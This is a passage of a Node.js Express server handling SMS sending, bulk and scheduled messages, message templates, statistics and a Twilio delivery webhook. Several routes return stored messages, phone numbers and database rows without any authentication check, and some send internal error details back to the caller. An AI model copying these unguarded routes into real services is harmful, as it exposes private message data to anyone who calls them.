              : providerStatus >= 400 && providerStatus < 500
                ? 400
                : providerStatus >= 500
                  ? 502
                  : error.code === "sms_config_error"
                    ? 500
                    : 500;
    console.error("sms_send_error", {
      request_id: req.requestId || null,
      actor: getOutboundActorKey(req, req.body?.user_chat_id),
      to: maskPhoneForLog(req.body?.to || ""),
      error: redactSensitiveLogValue(error.message || "sms_send_failed"),
      code: error.code || null,
    });
    sendApiError(
      res,
      status,
      error.code || "sms_send_failed",
      error.message || "Failed to send SMS",
      req.requestId,
    );
  }
});

// Send bulk SMS endpoint
app.post("/api/sms/bulk", requireOutboundAuthorization, async (req, res) => {
  try {
    const {
      recipients,
      message,
      options = {},
      user_chat_id,
      from,
      sms_options,
      idempotency_key,
      provider,
    } = req.body;
    const idempotencyHeader =
      req.headers["idempotency-key"] || req.headers["Idempotency-Key"];

    if (!recipients || !Array.isArray(recipients) || recipients.length === 0) {
      return sendApiError(
        res,
        400,
        "sms_validation_failed",
        "Recipients array is required and must not be empty",
        req.requestId,
      );
    }

    if (!message) {
      return sendApiError(
        res,
        400,
        "sms_validation_failed",
        "Message is required",
        req.requestId,
      );
    }

    const maxBulkRecipients = Math.min(
      250,
      Math.max(1, Number(config.email?.maxBulkRecipients) || 100),
    );
    if (recipients.length > maxBulkRecipients) {
      return sendApiError(
        res,
        400,
        "sms_validation_failed",
        `Maximum ${maxBulkRecipients} recipients per bulk send`,
        req.requestId,
      );
    }

    const maxSmsChars = Number(config.sms?.maxMessageChars) || 1600;
    if (String(message).length > maxSmsChars) {
      return sendApiError(
        res,
        400,
        "sms_validation_failed",
        `Message exceeds ${maxSmsChars} characters`,
        req.requestId,
      );
    }

    const limitResponse = await enforceOutboundRateLimits(req, res, {
      namespace: "sms_bulk",
      actorKey: getOutboundActorKey(req, user_chat_id),
      perUserLimit: Math.max(
        1,
        Math.floor((Number(config.outboundLimits?.sms?.perUser) || 15) / 3),
      ),
      globalLimit: Number(config.outboundLimits?.sms?.global) || 120,
      windowMs: Number(config.outboundLimits?.windowMs) || 60000,
    });
    if (limitResponse) {
      return;
    }

    const bulkOptions = { ...(options || {}) };
    if (from && !bulkOptions.from) {
      bulkOptions.from = from;
    }
    if (sms_options && !bulkOptions.smsOptions) {
      bulkOptions.smsOptions = sms_options;
    }
    if (provider) {
      bulkOptions.smsOptions = {
        ...(bulkOptions.smsOptions || {}),
        provider:
          bulkOptions.smsOptions?.provider || String(provider).trim().toLowerCase(),
      };
    }
    if (user_chat_id && !bulkOptions.userChatId) {
      bulkOptions.userChatId = String(user_chat_id);
    }
    if ((idempotency_key || idempotencyHeader) && !bulkOptions.idempotencyKey) {
      bulkOptions.idempotencyKey = idempotency_key || idempotencyHeader;
    }
    if (!Object.prototype.hasOwnProperty.call(bulkOptions, "durable")) {
      bulkOptions.durable = true;
    }

    console.log("sms_bulk_request", {
      request_id: req.requestId || null,
      actor: getOutboundActorKey(req, user_chat_id),
      recipients: recipients.length,
      provider: bulkOptions.smsOptions?.provider || getActiveSmsProvider(),
      durable: bulkOptions.durable === true,
      idempotency_key: bulkOptions.idempotencyKey ? "present" : "absent",
    });

    const result = await runWithTimeout(
      smsService.sendBulkSMS(
        recipients,
        message,
        bulkOptions,
      ),
      Number(config.outboundLimits?.handlerTimeoutMs) || 30000,
      "sms bulk handler",
      "sms_handler_timeout",
    );

    // Log bulk operation
    if (db) {
      await db.logBulkSMSOperation({
        total_recipients: result.total,
        successful: result.successful,
        failed: result.failed,
        message: message,
        user_chat_id: user_chat_id,
        timestamp: new Date(),
      });
    }

    res.json({
      success: true,
      ...result,
      request_id: req.requestId || null,
    });
  } catch (error) {
    const providerStatus = Number(
      error?.status || error?.statusCode || error?.response?.status,
    );
    const status =
      error.code === "idempotency_conflict"
        ? 409
        : error.code === "sms_validation_failed"
          ? 400
          : error.code === "sms_handler_timeout" ||
              error.code === "sms_provider_timeout" ||
              error.code === "sms_timeout"
            ? 504
            : providerStatus === 429
              ? 429
              : providerStatus >= 400 && providerStatus < 500
                ? 400
                : providerStatus >= 500
                  ? 502
                  : 500;
    console.error("sms_bulk_error", {
      request_id: req.requestId || null,
      actor: getOutboundActorKey(req, req.body?.user_chat_id),
      recipients: Array.isArray(req.body?.recipients)
        ? req.body.recipients.length
        : 0,
      error: redactSensitiveLogValue(error.message || "sms_bulk_failed"),
      code: error.code || null,
    });
    sendApiError(
      res,
      status,
      error.code || "sms_bulk_failed",
      error.message || "Failed to send bulk SMS",
      req.requestId,
    );
  }
});

// Schedule SMS endpoint
app.post("/api/sms/schedule", requireOutboundAuthorization, async (req, res) => {
  try {
    const {
      to,
      message,
      from,
      user_chat_id,
      scheduled_time,
      options = {},
      idempotency_key,
      provider,
    } = req.body;
    const idempotencyHeader =
      req.headers["idempotency-key"] || req.headers["Idempotency-Key"];

    if (!to || !message || !scheduled_time) {
      return sendApiError(
        res,
        400,
        "sms_validation_failed",
        "Phone number, message, and scheduled_time are required",
        req.requestId,
      );
    }

    const scheduledDate = new Date(scheduled_time);
    if (Number.isNaN(scheduledDate.getTime()) || scheduledDate <= new Date()) {
      return sendApiError(
        res,
        400,
        "sms_validation_failed",
        "Scheduled time must be in the future",
        req.requestId,
      );
    }

    const maxSmsChars = Number(config.sms?.maxMessageChars) || 1600;
    if (String(message).length > maxSmsChars) {
      return sendApiError(
        res,
        400,
        "sms_validation_failed",
        `Message exceeds ${maxSmsChars} characters`,
        req.requestId,
      );
    }

    const limitResponse = await enforceOutboundRateLimits(req, res, {
      namespace: "sms_schedule",
      actorKey: getOutboundActorKey(req, user_chat_id),
      perUserLimit: Number(config.outboundLimits?.sms?.perUser) || 15,
      globalLimit: Number(config.outboundLimits?.sms?.global) || 120,
      windowMs: Number(config.outboundLimits?.windowMs) || 60000,
    });
    if (limitResponse) {
      return;
    }

    const scheduleOptions = { ...(options || {}) };
    if (from && !scheduleOptions.from) {
      scheduleOptions.from = from;
    }
    if (user_chat_id && !scheduleOptions.userChatId) {
      scheduleOptions.userChatId = String(user_chat_id);
    }
    if ((idempotency_key || idempotencyHeader) && !scheduleOptions.idempotencyKey) {
      scheduleOptions.idempotencyKey = idempotency_key || idempotencyHeader;
    }
    if (provider && !scheduleOptions.provider) {
      scheduleOptions.provider = String(provider).trim().toLowerCase();
    }

    console.log("sms_schedule_request", {
      request_id: req.requestId || null,
      actor: getOutboundActorKey(req, user_chat_id),
      to: maskPhoneForLog(to),
      provider: scheduleOptions.provider || getActiveSmsProvider(),
      scheduled_at: scheduledDate.toISOString(),
      idempotency_key: scheduleOptions.idempotencyKey ? "present" : "absent",
    });

    const result = await runWithTimeout(
      smsService.scheduleSMS(
        to,
        message,
        scheduled_time,
        scheduleOptions,
      ),
      Number(config.outboundLimits?.handlerTimeoutMs) || 30000,
      "sms schedule handler",
      "sms_handler_timeout",
    );

    res.json({
      success: true,
      ...result,
      request_id: req.requestId || null,
    });
  } catch (error) {
    const providerStatus = Number(
      error?.status || error?.statusCode || error?.response?.status,
    );
    const status =
      error.code === "idempotency_conflict"
        ? 409
        : error.code === "sms_validation_failed"
          ? 400
          : error.code === "sms_handler_timeout" ||
              error.code === "sms_provider_timeout" ||
              error.code === "sms_timeout"
            ? 504
            : providerStatus === 429
              ? 429
              : providerStatus >= 400 && providerStatus < 500
                ? 400
                : providerStatus >= 500
                  ? 502
                  : 500;
    console.error("sms_schedule_error", {
      request_id: req.requestId || null,
      actor: getOutboundActorKey(req, req.body?.user_chat_id),
      to: maskPhoneForLog(req.body?.to || ""),
      error: redactSensitiveLogValue(error.message || "sms_schedule_failed"),
      code: error.code || null,
    });
    sendApiError(
      res,
      status,
      error.code || "sms_schedule_failed",
      error.message || "Failed to schedule SMS",
      req.requestId,
    );
  }
});

// SMS scripts endpoint
app.get("/api/sms/scripts", requireAdminToken, async (req, res) => {
  try {
    const { script_name, variables } = req.query;

    if (script_name) {
      try {
        const parsedVariables = variables ? JSON.parse(variables) : {};
        const script = smsService.getScript(script_name, parsedVariables);

        res.json({
          success: true,
          script_name,
          script,
          variables: parsedVariables,
        });
      } catch (scriptError) {
        res.status(400).json({
          success: false,
          error: scriptError.message,
        });
      }
    } else {
      // Return available scripts
      res.json({
        success: true,
        available_scripts: [
          "welcome",
          "appointment_reminder",
          "verification",
          "order_update",
          "payment_reminder",
          "promotional",
          "customer_service",
          "survey",
        ],
      });
    }
  } catch (error) {
    console.error("❌ SMS scripts error:", error);
    res.status(500).json({
      success: false,
      error: "Failed to get scripts",
    });
  }
});

// Get SMS messages from database for conversation view
app.get("/api/sms/messages/conversation/:phone", async (req, res) => {
  try {
    const { phone } = req.params;
    const limit = Math.min(parseInt(req.query.limit) || 50, 100);

    if (!phone) {
      return res.status(400).json({
        success: false,
        error: "Phone number is required",
      });
    }

    const messages = await db.getSMSConversation(phone, limit);

    res.json({
      success: true,
      phone: phone,
      messages: messages,
      message_count: messages.length,
    });
  } catch (error) {
    console.error("❌ Error fetching SMS conversation from database:", error);
    res.status(500).json({
      success: false,
      error: "Failed to fetch conversation",
      details: error.message,
    });
  }
});

// Get recent SMS messages from database
app.get("/api/sms/messages/recent", async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 10, 50);
    const offset = parseInt(req.query.offset) || 0;

    const messages = await db.getSMSMessages(limit, offset);

    res.json({
      success: true,
      messages: messages,
      count: messages.length,
      limit: limit,
      offset: offset,
    });
  } catch (error) {
    console.error("❌ Error fetching recent SMS messages:", error);
    res.status(500).json({
      success: false,
      error: "Failed to fetch recent messages",
      details: error.message,
    });
  }
});

// Get SMS database statistics
app.get("/api/sms/database-stats", async (req, res) => {
  try {
    const hours = parseInt(req.query.hours) || 24;
    const dateFrom = new Date(
      Date.now() - hours * 60 * 60 * 1000,
    ).toISOString();

    // Get comprehensive SMS statistics from database
    const stats = await new Promise((resolve, reject) => {
      const queries = {
        // Total messages
        totalMessages: `SELECT COUNT(*) as count FROM sms_messages`,

        // Messages by direction
        messagesByDirection: `
                    SELECT direction, COUNT(*) as count 
                    FROM sms_messages 
                    GROUP BY direction
                `,

        // Messages by status
        messagesByStatus: `
                    SELECT status, COUNT(*) as count 
                    FROM sms_messages 
                    GROUP BY status
                    ORDER BY count DESC
                `,

        // Recent messages
        recentMessages: `
                    SELECT * FROM sms_messages 
                    WHERE created_at >= ?
                    ORDER BY created_at DESC 
                    LIMIT 5
                `,

        // Bulk operations
        bulkOperations: `SELECT COUNT(*) as count FROM bulk_sms_operations`,

        // Recent bulk operations
        recentBulkOps: `
                    SELECT * FROM bulk_sms_operations 
                    WHERE created_at >= ?
                    ORDER BY created_at DESC 
                    LIMIT 3
                `,
      };

      const results = {};
      let completed = 0;
      const total = Object.keys(queries).length;

      for (const [key, query] of Object.entries(queries)) {
        const params = ["recentMessages", "recentBulkOps"].includes(key)
          ? [dateFrom]
          : [];

        db.db.all(query, params, (err, rows) => {
          if (err) {
            console.error(`SMS stats query error for ${key}:`, err);
            results[key] = key.includes("recent") ? [] : [{ count: 0 }];
          } else {
            results[key] = rows || [];
          }

          completed++;
          if (completed === total) {
            resolve(results);
          }
        });
      }
    });

    // Process the statistics
    const processedStats = {
      total_messages: stats.totalMessages[0]?.count || 0,
      sent_messages:
        stats.messagesByDirection.find((d) => d.direction === "outbound")
          ?.count || 0,
      received_messages:
        stats.messagesByDirection.find((d) => d.direction === "inbound")
          ?.count || 0,
      delivered_count:
        stats.messagesByStatus.find((s) => s.status === "delivered")?.count ||
        0,
      failed_count:
        stats.messagesByStatus.find((s) => s.status === "failed")?.count || 0,
      pending_count:
        stats.messagesByStatus.find((s) => s.status === "pending")?.count || 0,
      bulk_operations: stats.bulkOperations[0]?.count || 0,
      recent_messages: stats.recentMessages || [],
      recent_bulk_operations: stats.recentBulkOps || [],
      status_breakdown: stats.messagesByStatus || [],
      direction_breakdown: stats.messagesByDirection || [],
      time_period_hours: hours,
    };

    // Calculate success rate
    const totalSent = processedStats.sent_messages;
    const delivered = processedStats.delivered_count;
    processedStats.success_rate =
      totalSent > 0 ? Math.round((delivered / totalSent) * 100) : 0;

    res.json({
      success: true,
      ...processedStats,
    });
  } catch (error) {
    console.error("❌ Error fetching SMS database statistics:", error);
    res.status(500).json({
      success: false,
      error: "Failed to fetch database statistics",
      details: error.message,
    });
  }
});

// Get SMS status by message SID
app.get("/api/sms/status/:messageSid", async (req, res) => {
  try {
    const { messageSid } = req.params;

    const message = await new Promise((resolve, reject) => {
      db.db.get(
        `SELECT * FROM sms_messages WHERE message_sid = ?`,
        [messageSid],
        (err, row) => {
          if (err) {
            reject(err);
          } else {
            resolve(row);
          }
        },
      );
    });

    if (!message) {
      return res.status(404).json({
        success: false,
        error: "Message not found",
      });
    }

    res.json({
      success: true,
      message: message,
    });
  } catch (error) {
    console.error("❌ Error fetching SMS status:", error);
    res.status(500).json({
      success: false,
      error: "Failed to fetch message status",
      details: error.message,
    });
  }
});

// Enhanced SMS scripts endpoint with better error handling
app.get(
  "/api/sms/scripts/:scriptName?",
  requireAdminToken,
  async (req, res) => {
    try {
      const { scriptName } = req.params;
      const { variables } = req.query;

      // Built-in scripts (fallback)
      const builtInScripts = {
        welcome:
          "Welcome to our service! We're excited to have you aboard. Reply HELP for assistance or STOP to unsubscribe.",
        appointment_reminder:
          "Reminder: You have an appointment on {date} at {time}. Reply CONFIRM to confirm or RESCHEDULE to change.",
        verification:
          "Your verification code is: {code}. This code will expire in 10 minutes. Do not share this code with anyone.",
        order_update:
          "Order #{order_id} update: {status}. Track your order at {tracking_url}",
        payment_reminder:
          "Payment reminder: Your payment of {amount} is due on {due_date}. Pay now: {payment_url}",
        promotional:
          "🎉 Special offer just for you! {offer_text} Use code {promo_code}. Valid until {expiry_date}. Reply STOP to opt out.",
        customer_service:
          "Thanks for contacting us! We've received your message and will respond within 24 hours. For urgent matters, call {phone}.",
        survey:
          "How was your experience with us? Rate us 1-5 stars by replying with a number. Your feedback helps us improve!",
      };

      if (scriptName) {
        // Get specific script
        if (!builtInScripts[scriptName]) {
          return res.status(404).json({
            success: false,
            error: `Script '${scriptName}' not found`,
          });
        }

        let script = builtInScripts[scriptName];
        let parsedVariables = {};

        // Parse and apply variables if provided
        if (variables) {
          try {
            parsedVariables = JSON.parse(variables);

            // Replace variables in script
            for (const [key, value] of Object.entries(parsedVariables)) {
              script = script.replace(new RegExp(`{${key}}`, "g"), value);
            }
          } catch (parseError) {
            console.error("Error parsing script variables:", parseError);
            // Continue with script without variable substitution
          }
        }

        res.json({
          success: true,
          script_name: scriptName,
          script: script,
          original_script: builtInScripts[scriptName],
          variables: parsedVariables,
        });
      } else {
        // Get list of available scripts
        res.json({
          success: true,
          available_scripts: Object.keys(builtInScripts),
          script_count: Object.keys(builtInScripts).length,
        });
      }
    } catch (error) {
      console.error("❌ Error handling SMS scripts:", error);
      res.status(500).json({
        success: false,
        error: "Failed to process script request",
        details: error.message,
      });
    }
  },
);

// SMS webhook delivery status notifications (enhanced)
app.post("/webhook/sms-delivery", async (req, res) => {
  try {
    if (!requireValidTwilioSignature(req, res, "/webhook/sms-delivery")) {
      return;
    }
    const { MessageSid, MessageStatus, ErrorCode, ErrorMessage, To, From } =
      req.body;

    console.log(`📱 SMS Delivery Status: ${MessageSid} -> ${MessageStatus}`);

    // Update message status in database
    if (db) {
      await db.updateSMSStatus(MessageSid, {
        status: MessageStatus,
        error_code: ErrorCode,
        error_message: ErrorMessage,
      });

      // Get the original message to find user_chat_id for notification
      const message = await new Promise((resolve, reject) => {
        db.db.get(
          `SELECT * FROM sms_messages WHERE message_sid = ?`,
          [MessageSid],
          (err, row) => {
            if (err) reject(err);
            else resolve(row);
          },
        );
      });

      // Create webhook notification if user_chat_id exists
      if (message && message.user_chat_id) {
        const notificationType =
          MessageStatus === "delivered"
            ? "sms_delivered"
            : MessageStatus === "failed"
              ? "sms_failed"
              : `sms_${MessageStatus}`;

        await db.createEnhancedWebhookNotification(
          MessageSid,
          notificationType,
          message.user_chat_id,
          MessageStatus === "failed" ? "high" : "normal",
        );

        console.log(
          `📨 Created ${notificationType} notification for user ${message.user_chat_id}`,
        );
      }
    }

    res.status(200).send("OK");
  } catch (error) {
    console.error("❌ SMS delivery webhook error:", error);
    res.status(200).send("OK"); // Always return 200 to prevent retries
  }
});

// Get SMS statistics
app.get("/api/sms/stats", async (req, res) => {
  try {
    const stats = smsService.getStatistics();
    const activeConversations = smsService.getActiveConversations();

    res.json({
      success: true,
      statistics: stats,
      active_conversations: activeConversations.slice(0, 20), // Last 20 conversations
      sms_service_enabled: true,
    });
  } catch (error) {
    console.error("❌ SMS stats error:", error);
    res.status(500).json({
      success: false,
      error: "Failed to get SMS statistics",
    });
  }
});

// Bulk SMS status endpoint
app.get("/api/sms/bulk/status", async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 10, 50);
    const hours = parseInt(req.query.hours) || 24;
    const dateFrom = new Date(
      Date.now() - hours * 60 * 60 * 1000,
    ).toISOString();

    const bulkOperations = await new Promise((resolve, reject) => {
      db.db.all(
        `
                SELECT * FROM bulk_sms_operations 
                WHERE created_at >= ?
                ORDER BY created_at DESC 
                LIMIT ?
            `,
        [dateFrom, limit],
        (err, rows) => {
          if (err) {
            reject(err);
          } else {
            resolve(rows || []);
          }
        },
      );
    });

    // Get summary statistics
    const summary = bulkOperations.reduce(
      (acc, op) => {
        acc.totalOperations += 1;
        acc.totalRecipients += op.total_recipients;
        acc.totalSuccessful += op.successful;
        acc.totalFailed += op.failed;
        return acc;
      },
      {
        totalOperations: 0,
        totalRecipients: 0,
        totalSuccessful: 0,
        totalFailed: 0,
      },
    );

    summary.successRate =
      summary.totalRecipients > 0
        ? Math.round((summary.totalSuccessful / summary.totalRecipients) * 100)
        : 0;

    res.json({
      success: true,
      summary: summary,
      operations: bulkOperations,
      time_period_hours: hours,
    });
  } catch (error) {
    console.error("❌ Error fetching bulk SMS status:", error);
    res.status(500).json({
      success: false,
      error: "Failed to fetch bulk SMS status",
      details: error.message,
    });
  }
});

if (require.main === module) {
  startServer();
}

module.exports = {
  app,
  startServer,
  __testables: {
    getVoiceAgentRuntimeConfig,
    getOrCreateVoiceAgentRuntimeState,
    clearVoiceAgentTurnWatchdog,
    clearVoiceAgentRuntime,
    armVoiceAgentTurnWatchdog,
    markVoiceAgentAgentResponsive,
    clampVoiceAgentFunctionResult,
    executeVoiceAgentFunctionWithGuard,
    resetVoiceAgentRuntimeForTests,
    verifyTelegramWebhookAuth,
    verifyAwsWebhookAuth,
    verifyAwsStreamAuth,
    buildStreamAuthToken,
  },
};

// Enhanced graceful shutdown with comprehensive cleanup
process.on("SIGINT", async () => {
  console.log("\n🛑 Shutting down enhanced adaptive system gracefully...");

  try {
    // Log shutdown start
    await db.logServiceHealth("system", "shutdown_initiated", {
      active_calls: callConfigurations.size,
      tracked_calls: callFunctionSystems.size,
    });

    // Stop services
    webhookService.stop();
    callConfigurations.clear();
    callFunctionSystems.clear();
    callDirections.clear();
    for (const timer of keypadDtmfWatchdogs.values()) {
      clearTimeout(timer);
    }
    keypadDtmfWatchdogs.clear();
    keypadDtmfSeen.clear();
    keypadProviderOverrides.clear();
    keypadProviderGuardWarnings.clear();

    // Log successful shutdown
    await db.logServiceHealth("system", "shutdown_completed", {
      timestamp: new Date().toISOString(),
    });

    await db.close();
    console.log("✅ Enhanced adaptive system shutdown complete");
  } catch (shutdownError) {
    console.error("❌ Error during shutdown:", shutdownError);
  }

  process.exit(0);
});

process.on("SIGTERM", async () => {
  console.log("\nShutting down enhanced adaptive system gracefully...");

  try {
    // Log shutdown start
    await db.logServiceHealth("system", "shutdown_initiated", {
      active_calls: callConfigurations.size,
      tracked_calls: callFunctionSystems.size,
      reason: "SIGTERM",
    });

    // Stop services
    webhookService.stop();
    callConfigurations.clear();
    callFunctionSystems.clear();
    callDirections.clear();
    for (const timer of keypadDtmfWatchdogs.values()) {
      clearTimeout(timer);
    }
    keypadDtmfWatchdogs.clear();
    keypadDtmfSeen.clear();
    keypadProviderOverrides.clear();
    keypadProviderGuardWarnings.clear();

    // Log successful shutdown
    await db.logServiceHealth("system", "shutdown_completed", {
      timestamp: new Date().toISOString(),
    });

    await db.close();
    console.log("Enhanced adaptive system shutdown complete");
  } catch (shutdownError) {
    console.error("Error during shutdown:", shutdownError);
  }

  process.exit(0);
});
